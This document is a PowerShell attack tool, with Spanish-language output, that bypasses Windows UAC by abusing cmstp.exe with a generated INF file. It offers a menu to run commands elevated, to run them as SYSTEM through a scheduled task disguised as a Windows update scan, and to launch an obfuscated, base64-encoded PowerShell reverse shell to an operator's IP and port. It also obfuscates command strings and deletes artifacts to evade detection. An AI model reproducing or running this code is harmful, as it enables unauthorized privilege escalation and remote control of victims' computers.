# UAC_Bypass.ps1
# Versión para LockDown 2025 
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

Function SetInfFile($CommandToExecute) {
    $localAppData = [Environment]::GetFolderPath("LocalApplicationData")
    
    if ($CommandToExecute -like "*powershell.exe*" -and $CommandToExecute -notlike "*EncodedCommand*") {
        $obfuscatedCommand = "cmd.exe /c `"set p=power^shell^.exe&call C:\Windows\System32\WindowsPowerShell\v1.0\%%p%`""
    }
    elseif ($CommandToExecute -like "cmd.exe*" -or $CommandToExecute -like "*.exe*") {
        $parts = $CommandToExecute -split " "
        $executable = $parts[0]
        $arguments = $parts[1..($parts.Length-1)] -join " "
        
        if ($executable -eq "cmd.exe") {
            $obfuscatedCommand = "cmd.exe /c `"set c=cm&set d=d.&set e=exe&call %%c%%%%d%%%%e%% $arguments`""
        }
        else {
            $exeName = [System.IO.Path]::GetFileNameWithoutExtension($executable)
            $exeExt = [System.IO.Path]::GetExtension($executable)
            $obfuscatedCommand = "cmd.exe /c `"set exe=$exeName$exeExt&call %%exe%% $arguments`""
        }
    }
    elseif ($CommandToExecute -like "*EncodedCommand*") {
        $obfuscatedCommand = $CommandToExecute
    }
    else {
        $obfuscatedCommand = "cmd.exe /c `"$CommandToExecute`""
    }
    
    $InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
LINE
cmd /c "t^a^s^k^k^i^l^l /I^M c^m^s^t^p.^e^x^e /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="LockDown_VPN"
ShortSvcName="Net_Svc"
'@.Replace("LINE", $obfuscatedCommand)

    $randomName = "config_" + (Get-Random -Minimum 10000 -Maximum 99999) + ".tmp"
    $file = Join-Path $localAppData $randomName
    
    Set-Content -Path $file -Value $InfData
    Write-Host "[+] Archivo INF creado: $(Split-Path $file -Leaf)" -ForegroundColor Green
    return $file
}

Function Execute-UACBypass($CommandToExecute) {
    $infPath = $null
    try {
        Write-Host "[+] Iniciando UAC Bypass..." -ForegroundColor Yellow
        
        $infPath = SetInfFile($CommandToExecute)
        
        Write-Host "[+] Ejecutando cmstp.exe..." -ForegroundColor Yellow
        $s = New-Object System.Diagnostics.ProcessStartInfo
        $s.FileName = "cmstp.exe"
        $s.Arguments = "/au `"$infPath`""
        $s.UseShellExecute = $true
        $s.WindowStyle = "Hidden"
        [System.Diagnostics.Process]::Start($s) | Out-Null
        
        $waitTime = Get-Random -Minimum 2 -Maximum 4
        Write-Host "[+] Esperando ventana UAC ($waitTime segundos)..." -ForegroundColor Yellow
        Start-Sleep -Seconds $waitTime
        
        $Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 
{
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr FindWindow(IntPtr sClassName, String sAppName);

    [DllImport("user32.dll")]
    public static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
}
"@

        Add-Type $Win32
        
        Write-Host "[+] Buscando ventana 'LockDown_VPN'..." -ForegroundColor Yellow
        $windowFound = $false
        
        for ($i = 0; $i -lt 10; $i++) {
            $WindowToFind = [Win32]::FindWindow([IntPtr]::Zero, "LockDown_VPN")
            
            if ($WindowToFind -ne [IntPtr]::Zero) {
                Write-Host "[+] Ventana encontrada (intento $($i+1)), enviando ENTER..." -ForegroundColor Green
                
                $WM_SYSKEYDOWN = 0x0100;
                $VK_RETURN = 0x0D;
                [Win32]::PostMessage($WindowToFind, $WM_SYSKEYDOWN, $VK_RETURN, 0)
                
                $windowFound = $true
                break
            }
            
            Start-Sleep -Milliseconds 500
        }
        
        if (-not $windowFound) {
            Write-Host "[-] No se pudo encontrar la ventana después de 10 intentos" -ForegroundColor Red
            return $false
        }
        
        Write-Host "[+] UAC Bypass completado" -ForegroundColor Green
        
        Start-Sleep -Seconds 2
        return $true
    }
    catch {
        Write-Host "[-] Error: $_" -ForegroundColor Red
        return $false
    }
    finally {
        if ($infPath -and (Test-Path $infPath)) {
            try {
                Remove-Item $infPath -Force -ErrorAction SilentlyContinue
                Write-Host "[+] Archivo INF eliminado" -ForegroundColor Green
            }
            catch {
                Write-Host "[-] No se pudo eliminar el archivo INF inmediatamente..." -ForegroundColor Yellow
                Start-Sleep -Seconds 2
                try {
                    Remove-Item $infPath -Force -ErrorAction SilentlyContinue
                    Write-Host "[+] Archivo INF eliminado en segundo intento" -ForegroundColor Green
                }
                catch {
                    Write-Host "[-] No se pudo eliminar el archivo INF: $infPath" -ForegroundColor Red
                }
            }
        }
    }
}

Function Execute-Command($CommandToExecute) {
    Write-Host "[+] Ejecutando comando: $CommandToExecute" -ForegroundColor Yellow
    
    $tempDir = $env:TEMP
    $randomSuffix = Get-Random -Minimum 10000 -Maximum 99999
    $outputFile = Join-Path $tempDir ("cmdout_$randomSuffix.tmp")
    
    try {
        $captureCommand = "cmd.exe /c `"$CommandToExecute`" > `"$outputFile`" 2>&1"
        
        Write-Host "[+] Archivo de output temporal: $(Split-Path $outputFile -Leaf)" -ForegroundColor Gray
        
        $result = Execute-UACBypass $captureCommand
        
        if ($result) {
            Write-Host "[+] Comando ejecutado, esperando output..." -ForegroundColor Yellow
            Start-Sleep -Seconds 3
            
            if (Test-Path $outputFile) {
                try {
                    $outputContent = Get-Content $outputFile -Raw -ErrorAction Stop
                    
                    Write-Host "[+] Output del comando:" -ForegroundColor Green
                    Write-Host ("=" * 50) -ForegroundColor Cyan
                    
                    if ([string]::IsNullOrWhiteSpace($outputContent)) {
                        Write-Host "(El comando se ejecutó sin output visible)" -ForegroundColor Gray
                    } else {
                        Write-Host $outputContent.Trim()
                    }
                    
                    Write-Host ("=" * 50) -ForegroundColor Cyan
                }
                catch {
                    Write-Host "[-] Error leyendo el archivo de output: $_" -ForegroundColor Red
                }
            } else {
                Write-Host "[-] No se generó archivo de output" -ForegroundColor Yellow
                Write-Host "[!] El comando puede estar ejecutándose en segundo plano" -ForegroundColor Yellow
            }
        } else {
            Write-Host "[-] El bypass de UAC falló" -ForegroundColor Red
        }
        
        return $result
    }
    catch {
        Write-Host "[-] Error en Execute-Command: $_" -ForegroundColor Red
        return $false
    }
    finally {
        if (Test-Path $outputFile) {
            try {
                Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
                Write-Host "[+] Archivo temporal eliminado" -ForegroundColor Gray
            } catch {
                Write-Host "[-] No se pudo eliminar el archivo temporal" -ForegroundColor Yellow
            }
        }
    }
}

Function Execute-CommandAsSystem {
    param(
        [string]$CommandToExecute
    )
    
    Write-Host "[+] Ejecutando comando como SYSTEM: $CommandToExecute" -ForegroundColor Yellow
    
    $taskName = "WindowsUpdateScan_" + (Get-Random -Minimum 1000 -Maximum 9999)
    $tempDir = $env:TEMP
    $outputFile = Join-Path $tempDir ("scan_results_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".tmp")
    $scriptFile = $null
    
    try {
        $tempScript = @"
@echo off
chcp 65001 >nul
$CommandToExecute > "$outputFile" 2>&1
exit /b 0
"@
        
        $scriptFile = Join-Path $tempDir ("wsus_scan_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".bat")
        Set-Content -Path $scriptFile -Value $tempScript -Encoding ASCII

        $futureTime = (Get-Date).AddMinutes(2).ToString("HH:mm")
        
        $createTask = "schtasks /create /tn `"$taskName`" /tr `"$scriptFile`" /sc once /st $futureTime /ru SYSTEM /f >nul 2>&1"
        $runTask = "schtasks /run /tn `"$taskName`" >nul 2>&1"
        $waitAndClean = "timeout /t 5 >nul && schtasks /delete /tn `"$taskName`" /f >nul 2>&1"
        
        $fullCommand = "cmd.exe /c $createTask && $runTask && $waitAndClean"
        
        Write-Host "[+] Ejecutando tarea programada de forma silenciosa..." -ForegroundColor Yellow
        $result = Execute-UACBypass -CommandToExecute $fullCommand
        
        if ($result) {
            Write-Host "[+] Tarea ejecutada, recuperando resultados..." -ForegroundColor Green
            
            Start-Sleep -Seconds 4
            
            if (Test-Path $outputFile) {
                Write-Host "[+] Output del comando:" -ForegroundColor Green
                Write-Host ("=" * 50) -ForegroundColor Cyan
                try {
                    $content = Get-Content $outputFile -ErrorAction Stop
                    if ($content) {
                        foreach ($line in $content) {
                            Write-Host $line
                        }
                    } else {
                        Write-Host "(Comando ejecutado sin output visible)" -ForegroundColor Gray
                    }
                }
                catch {
                    Write-Host "[-] Error leyendo resultados: $_" -ForegroundColor Red
                }
                Write-Host ("=" * 50) -ForegroundColor Cyan
            } else {
                Write-Host "[!] Comando ejecutado, pero no se generó output" -ForegroundColor Yellow
            }
        } else {
            Write-Host "[-] Error en la ejecución" -ForegroundColor Red
        }
        
        return $result
    }
    catch {
        Write-Host "[-] Error: $_" -ForegroundColor Red
        return $false
    }
    finally {
        Start-Sleep -Seconds 1
        
        $filesToDelete = @($outputFile, $scriptFile)
        foreach ($file in $filesToDelete) {
            if ($file -and (Test-Path $file)) {
                try {
                    Remove-Item $file -Force -ErrorAction SilentlyContinue
                } catch {
                }
            }
        }
        
        try {
            $null = schtasks /delete /tn $taskName /f 2>$null
        } catch {
        }
    }
}

Function Invoke-PowerShellReverseShell {
    param(
        [string]$IP,
        [string]$Port
    )
    
    Write-Host "[+] Configurando PowerShell Reverse Shell (Linkin Park Method)..." -ForegroundColor Yellow
    Write-Host "[+] IP: $($IP), Puerto: $($Port)" -ForegroundColor Cyan

    $chesterScript = @"
try {
    `$chester = New-Object System.Net.Sockets.TCPClient('$IP',$Port);
    `$mike=`$chester.GetStream();
    [byte[]]`$shinoda=0..65535|%{0};
    while((`$bennington=`$mike.Read(`$shinoda,0,`$shinoda.Length)) -ne 0){
        `$hahn=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$shinoda,0,`$bennington);
        `$phoenix=(iex `$hahn 2>&1 | Out-String);
        `$sun=('p','w','d')-join'';
        `$moon=('P','a','t','h')-join'';
        `$bourdon=`$phoenix+'PS ['+(&`$sun).`$moon+'] > ';
        `$delson=([text.encoding]::ASCII).GetBytes(`$bourdon);
        `$mike.Write(`$delson,0,`$delson.Length);
        `$mike.Flush()
    };
    `$chester.Close()
} catch {
}
"@

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($chesterScript)
    $encodedScript = [Convert]::ToBase64String($bytes)
    
    $powerShellCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -EncodedCommand $encodedScript"
    
    Write-Host "[+] Ejecutando PowerShell Reverse Shell codificada..." -ForegroundColor Green
    
    $result = Execute-UACBypass $powerShellCommand
    
    if ($result) {
        Write-Host "[+] PowerShell Reverse Shell ejecutada exitosamente" -ForegroundColor Green
        Write-Host "[!] Verifica tu listener en $($IP):$($Port)" -ForegroundColor Yellow
        Write-Host "[!] La reverse shell se ejecuta en segundo plano" -ForegroundColor Yellow
    } else {
        Write-Host "[-] Falló la ejecución de la reverse shell" -ForegroundColor Red
    }
    
    return $result
}

Function Invoke-ReverseShellMenu {
    Write-Host "[+] Configuración de Reverse Shell" -ForegroundColor Cyan
    $ip = Read-Host "Ingresa la IP"
    $port = Read-Host "Ingresa el Puerto"
    
    if (-not $ip -or -not $port) {
        Write-Host "[-] Debes ingresar IP y Puerto" -ForegroundColor Red
        return $false
    }
    
    Write-Host "`n[+] Ejecutando PowerShell Reverse Shell Ofuscada..." -ForegroundColor Green
    
    $result = Invoke-PowerShellReverseShell -IP $ip -Port $port
    if ($result) {
        Write-Host "[+] PowerShell Reverse Shell ejecutada exitosamente" -ForegroundColor Green
        Write-Host "[!] Verifica tu listener en $($ip):$($port)" -ForegroundColor Yellow
    } else {
        Write-Host "[-] Falló la ejecución de la reverse shell" -ForegroundColor Red
    }
    
    return $result
}

Function Test-AdminPrivileges {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
    $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if ($isAdmin) {
        Write-Host "[+] Tienes privilegios de administrador" -ForegroundColor Green
        Write-Host "[+] Usuario: $($identity.Name)" -ForegroundColor Yellow
    } else {
        Write-Host "[-] NO tienes privilegios de administrador" -ForegroundColor Red
        Write-Host "[-] Usuario: $($identity.Name)" -ForegroundColor Yellow
    }
}

Function Invoke-Cleanup {
    Write-Host "[+] Realizando limpieza de artefactos..." -ForegroundColor Yellow
    
    $localAppData = [Environment]::GetFolderPath("LocalApplicationData")
    $tempDir = $env:TEMP
    
    $patterns = @(
        "$localAppData\setup_*.inf",
        "$localAppData\config_*.inf", 
        "$localAppData\config_*.tmp",
        "$localAppData\log_*.tmp",
        "$localAppData\output_*.txt",
        "$localAppData\system_output_*.tmp",
        "$localAppData\system_script_*.bat",
        "$tempDir\cmdout_*.tmp",
        "$tempDir\system_output_*.tmp",
        "$tempDir\system_script_*.bat"
    )
    
    $cleanedCount = 0
    foreach ($pattern in $patterns) {
        try {
            $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
            if ($files) {
                $files | Remove-Item -Force -ErrorAction SilentlyContinue
                $cleanedCount += $files.Count
            }
        }
        catch {
        }
    }
    
    Write-Host "[+] Cerrando procesos cmstp.exe residuales..." -ForegroundColor Yellow
    $processesKilled = 0
    
    try {
        $cmstpProcesses = Get-Process -Name "cmstp" -ErrorAction SilentlyContinue
        if ($cmstpProcesses) {
            $cmstpProcesses | Stop-Process -Force -ErrorAction SilentlyContinue
            $processesKilled += $cmstpProcesses.Count
            Write-Host "[+] Terminados $($cmstpProcesses.Count) procesos cmstp.exe" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[-] Error con método PowerShell" -ForegroundColor Yellow
    }
    
    try {
        Start-Sleep -Milliseconds 500
        $remainingProcesses = Get-Process -Name "cmstp" -ErrorAction SilentlyContinue
        if ($remainingProcesses) {
            Write-Host "[+] Intentando con taskkill..." -ForegroundColor Yellow
            $null = cmd /c "taskkill /IM cmstp.exe /F >nul 2>&1"
            Start-Sleep -Seconds 1
            
            $finalCheck = Get-Process -Name "cmstp" -ErrorAction SilentlyContinue
            if ($finalCheck) {
                Write-Host "[-] No se pudieron terminar todos los procesos cmstp.exe" -ForegroundColor Red
            } else {
                Write-Host "[+] Taskkill completado exitosamente" -ForegroundColor Green
            }
        }
    }
    catch {
        Write-Host "[-] Error con taskkill" -ForegroundColor Yellow
    }
    
    Write-Host "[+] Limpieza completada ($cleanedCount archivos eliminados, $processesKilled procesos terminados)" -ForegroundColor Green
}

Function Show-MainMenu {
    Clear-Host
    Write-Host "=== UAC Bypass for LockDown 2025 ===" -ForegroundColor Cyan
    Write-Host ""

    Write-Host "[+] Verificando privilegios actuales..." -ForegroundColor Yellow
    $isAlreadyAdmin = Test-AdminPrivileges

    if ($isAlreadyAdmin) {
        Write-Host ""
        Write-Host "[!] Ya eres administrador - el bypass no es necesario" -ForegroundColor Yellow
    }

    Write-Host ""
    Write-Host "Selecciona una opción:" -ForegroundColor White
    Write-Host "1. Abrir PowerShell elevado" -ForegroundColor Gray
    Write-Host "2. Ejecutar comando" -ForegroundColor Gray
    Write-Host "3. Ejecutar comando como SYSTEM" -ForegroundColor Cyan
    Write-Host "4. PowerShell Reverse Shell" -ForegroundColor Green
    Write-Host "5. Verificar privilegios" -ForegroundColor Gray
    Write-Host "6. Limpieza de artefactos" -ForegroundColor Yellow
    Write-Host "7. Salir" -ForegroundColor Gray
    Write-Host ""
}

do {
    Show-MainMenu
    $opcion = Read-Host "Opción"

    switch ($opcion) {
        "1" { 
            Write-Host "[+] Abriendo PowerShell con elevación..." -ForegroundColor Yellow
            $result = Execute-UACBypass "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
            if ($result) {
                Write-Host "[+] PowerShell ejecutado con elevación" -ForegroundColor Green
            } else {
                Write-Host "[-] Falló el bypass para PowerShell" -ForegroundColor Red
            }
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "2" { 
            $comando = Read-Host "Ingresa el comando a ejecutar"
            if ($comando) {
                $null = Execute-Command -CommandToExecute $comando
            }
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "3" { 
            $comando = Read-Host "Ingresa el comando a ejecutar como SYSTEM"
            if ($comando) {
                $null = Execute-CommandAsSystem -CommandToExecute $comando
            }
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "4" { 
            $null = Invoke-ReverseShellMenu
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "5" { 
            Test-AdminPrivileges
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "6" {
            Invoke-Cleanup
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "7" { 
            Write-Host "[+] Realizando limpieza final..." -ForegroundColor Yellow
            Invoke-Cleanup
            Write-Host "[+] Saliendo..." -ForegroundColor Green
            exit
        }
        default {
            Write-Host "[-] Opción no válida" -ForegroundColor Red
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
    }
} while ($true)
